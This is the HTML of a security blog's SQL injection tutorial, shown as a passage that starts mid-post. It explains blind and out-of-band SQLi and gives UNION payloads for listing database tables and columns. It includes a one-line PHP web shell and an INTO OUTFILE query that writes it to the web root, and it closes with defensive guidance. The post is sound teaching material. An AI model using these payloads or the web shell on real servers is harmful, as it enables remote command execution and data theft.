</pre></table></code></div></div><ul><li>Use the UNION operator to output information from the database</ul><h3 id="exploiting-boolean-based-blind-sqli"><span class="mr-2">Exploiting Boolean-Based Blind SQLi</span><a href="#exploiting-boolean-based-blind-sqli" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>Submit a Boolean condition that evaluate to True/False and note the response<li>Write a program that uses conditional statements to ask the database a series of True/False questions and monitor response<h3 id="exploiting-time-based-blind-sqli"><span class="mr-2">Exploiting Time-Based Blind SQLi</span><a href="#exploiting-time-based-blind-sqli" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><li>Submit a payload that pauses the application for a specified period of time<li>Write a program that uses conditional statements to ask the database a series of True/False questions and monitor response<h3 id="exploiting-out-of-band-sqli"><span class="mr-2">Exploiting Out-of-Band SQLi</span><a href="#exploiting-out-of-band-sqli" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><li>Submit OAST payloads designed to trigger an out-of-band network interaction when executed within an SQL query, and monitor for any resulting interactions<li>Depending on SQL injection use different methods for exfill data<h2 id="escalating-the-attack"><span class="mr-2">Escalating the Attack</span><a href="#escalating-the-attack" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="learn-about-the-database"><span class="mr-2">Learn About the Database</span><a href="#learn-about-the-database" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>First, we need information about the structure of the database, the payloads previously reviewed require some knowledge of the database, such as table names or field names, so we can attempt some trial-error SQL queries to determine the database version, it should look like this:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="n">Title</span><span class="p">,</span> <span class="n">Body</span> <span class="k">FROM</span> <span class="n">Emails</span> <span class="k">WHERE</span> <span class="n">Username</span><span class="o">=</span><span class="s1">'jesus'</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="o">@@</span><span class="k">version</span><span class="p">;</span><span class="c1">--</span>
</pre></table></code></div></div><p>Once you know the version of database, you can extract the table names with specific commands for each database version, it should look like this:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="n">Title</span><span class="p">,</span> <span class="n">Body</span> <span class="k">FROM</span> <span class="n">Emails</span> <span class="k">WHERE</span> <span class="n">Username</span><span class="o">=</span><span class="s1">'jesus'</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="mi">1</span><span class="p">,</span> <span class="k">table_name</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span>
</pre></table></code></div></div><p>And this one will show you the columns names of the specific table:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="n">Title</span><span class="p">,</span> <span class="n">Body</span> <span class="k">FROM</span> <span class="n">Emails</span> <span class="k">WHERE</span> <span class="n">Username</span><span class="o">=</span><span class="s1">'jesus'</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="mi">1</span><span class="p">,</span> <span class="k">column_name</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">WHERE</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'Users'</span>
</pre></table></code></div></div><h3 id="gain-a-web-shell"><span class="mr-2">Gain a Web Shell</span><a href="#gain-a-web-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Another way to escalate SQLi is getting a web shell on the server, for example if we are attacking a php website, the following code will take the request parameter named <em>cmd</em> and execute it as a system command.</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="cp">&lt;?</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span> <span class="cp">?&gt;</span>
</pre></table></code></div></div><p>Also you can upload php code to location in the web server you can access, . For example, you can write the password of a nonexistent user and the PHP code <code class="language-plaintext highlighter-rouge">&lt;? system($_REQUEST['cmd']); ?&gt;</code> into a file located at <em>/var/www/html/shell.php</em> on the target server:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="n">Password</span> <span class="k">FROM</span> <span class="n">Users</span> <span class="k">WHERE</span> <span class="n">Username</span><span class="o">=</span><span class="s1">'abc'</span><span class="k">UNION</span> <span class="k">SELECT</span> <span class="nv">"&lt;? system($_REQUEST['cmd']); ?&gt;"</span><span class="k">INTO</span> <span class="n">OUTFILE</span> <span class="nv">"/var/www/html/shell.php"</span>
</pre></table></code></div></div><p>Since the password will be blank because not exist, you are uploading the php script in that file, then you can simply access the file and execute any command you wish: <code class="language-plaintext highlighter-rouge">http://www.example.com/shell.php?cmd=COMMAND</code></p></ul><h2 id="how-to-prevent-sqli-vulnerabilites"><span class="mr-2">How to prevent SQLi vulnerabilites?</span><a href="#how-to-prevent-sqli-vulnerabilites" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li>Primary Defenses:<ul><li><strong>Use of Prepared Statements (Parameterized Queries)</strong><ul><li>Code Vulnerable to SQLi<li><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli2.jpg" alt="" data-proofer-ignore><li>The user supplied input <em>customer name</em> is embedded directly into the SQL statement<li>The construction of the SQL statement is performed in two steps:<li>The application specifies the query structure with placeholders for each user input<li>The application specifies the content of each placeholder<li>Code not vulnerable to SQLi<li><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli3.jpg" alt="" data-proofer-ignore></ul><li>Use of Stores Procedures<ul><li>Is a batch of statements grouped together and stored in the database<li>Not always safe from SQL Injection, still need to be called in a parameterized way</ul><li>Whitelist Input Validation<ul><li>Defining what values are authorized, everything else is unauthorized<li>Useful for values that cannot be specified as parameter placeholders, such as a table name</ul><li>Escaping All User Supplied Input<ul><li>Only used as last resort</ul></ul><li>Optional Defenses:<ul><li>Least Privilege<ul><li>The application should use the lowest possible level of privileges when accessing the database<li>Any unnecessary default functionality in the database should be removed or disabled<li>Ensure CIS benchmark for the database in use is applied<li>All vendor-issued security patches should be applied in a timely fashion</ul></ul></ul><h2 id="references"><span class="mr-2">References</span><a href="#references" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy - SQL Injection</a><li><a href="https://owasp.org/www-community/attacks/SQL_Injection">OWASP Top 10 - SQL Injection</a><li><a href="https://www.amazon.com/Bug-Bounty-Bootcamp-Reporting-Vulnerabilities-ebook/dp/B08YK368Y3">Bug Bounty Bootcamp</a></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/web-security/'>Web Security</a>, <a href='/categories/portswigger-academy/'>Portswigger Academy</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/web-security/" class="post-tag no-text-decoration" >web security</a> <a href="/tags/theory/" class="post-tag no-text-decoration" >theory</a> <a href="/tags/owasp/" class="post-tag no-text-decoration" >owasp</a> <a href="/tags/sqli/" class="post-tag no-text-decoration" >sqli</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=SQL+Injection+-+s4yhii%27s+Blog&url=https%3A%2F%2Fs4yhii.github.io%2Fposts%2FSQL-Injection%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=SQL+Injection+-+s4yhii%27s+Blog&u=https%3A%2F%2Fs4yhii.github.io%2Fposts%2FSQL-Injection%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fs4yhii.github.io%2Fposts%2FSQL-Injection%2F&text=SQL+Injection+-+s4yhii%27s+Blog" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Tickets-popcorn-please/">Tickets and Popcorn please!, The Day main.js Became the Key Vault</a><li><a href="/posts/CyberApocalypse-CTF2025-Web/">Cyber Apocalypse 2025 - 6x Web Challenges Writeup</a><li><a href="/posts/CyberApocalypse-CTF2024-Web/">Cyber Apocalypse 2024 - 4x Web Challenges Writeup</a><li><a href="/posts/Web-Cache-Poisoning/">Web Cache Poisoning Techniques</a><li><a href="/posts/HTB-Cyber-Apocalypse-CTF-Web-Writeups/">Cyber Apocalypse 2023 2x Web Challenges Writeup</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/web-security/">web security</a> <a class="post-tag" href="/tags/owasp/">owasp</a> <a class="post-tag" href="/tags/labs/">labs</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/cloud/">cloud</a> <a class="post-tag" href="/tags/cms/">cms</a> <a class="post-tag" href="/tags/python/">python</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/SQL-Injection-Labs/"><div class="card-body"> <em class="small" data-ts="1643126400" data-df="ll" > Jan 25, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>SQL Injection - Labs</h3><div class="text-muted small"><p> Lab 1 - SQL injection vulnerability in WHERE clause allowing retrieval of hidden data We need to retrieve hidden data so we search query’s in the web where we can inject some sql injection payloads...</p></div></div></a></div><div class="card"> <a href="/posts/Cross-site-scripting-(XSS)/"><div class="card-body"> <em class="small" data-ts="1644854400" data-df="ll" > Feb 14, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Cross-site scripting (XSS)</h3><div class="text-muted small"><p> Cross-site scripting known as XSS is a web vulnerability in which malicious scripts are injected int benign and trusted websites. XSS occur when an attacker send malicious code in any user input fi...</p></div></div></a></div><div class="card"> <a href="/posts/Broken-Authentication/"><div class="card-body"> <em class="small" data-ts="1647360000" data-df="ll" > Mar 15, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Broken Authentication</h3><div class="text-muted small"><p> Authentication is the process of verifying the identity of a given user or client. In other words, it involves making sure that they really are who they claim to be, there are three authentication ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Vuln-Scan-With-Nessus-in-AWS/" class="btn btn-outline-primary" prompt="Older"><p>Vulnerability Management with Nessus in AWS</p></a> <a href="/posts/SQL-Injection-Labs/" class="btn btn-outline-primary" prompt="Newer"><p>SQL Injection - Labs</p></a></div><script type="text/javascript"> $(function () { const origin = "https://giscus.app"; const iframe = "iframe.giscus-frame"; const lightTheme = "light"; const darkTheme = "dark_dimmed"; let initTheme = lightTheme; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = darkTheme; } let giscusAttributes = { "src": "https://giscus.app/client.js", "data-repo": "s4yhii/s4yhii.github.io", "data-repo-id": "R_kgDOHtsc-g", "data-category": "Announcements", "data-category-id": "DIC_kwDOHtsc-s4CQh10", "data-mapping": "title", "data-reactions-enabled": "1", "data-emit-metadata": "0", "data-theme": initTheme, "data-input-position": "top", "data-lang": "en", "crossorigin": "anonymous", "async": "" }; let giscusScript = document.createElement("script"); Object.entries(giscusAttributes).forEach(([key, value]) => giscusScript.setAttribute(key, value)); document.getElementById("tail-wrapper").appendChild(giscusScript); addEventListener("message", (event) => { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* global theme mode changed */ const mode = event.data.message; const theme = (mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme); const message = { setConfig: { theme: theme } }; const giscus = document.querySelector(iframe).contentWindow; giscus.postMessage({ giscus: message }, origin); } }); }); </script></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://twitter.com/s4yhii">Jesus Lujan</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/web-security/">web security</a> <a class="post-tag" href="/tags/owasp/">owasp</a> <a class="post-tag" href="/tags/labs/">labs</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/cloud/">cloud</a> <a class="post-tag" href="/tags/cms/">cms</a> <a class="post-tag" href="/tags/python/">python</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-V0V53P7YVQ"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-V0V53P7YVQ'); }); </script>
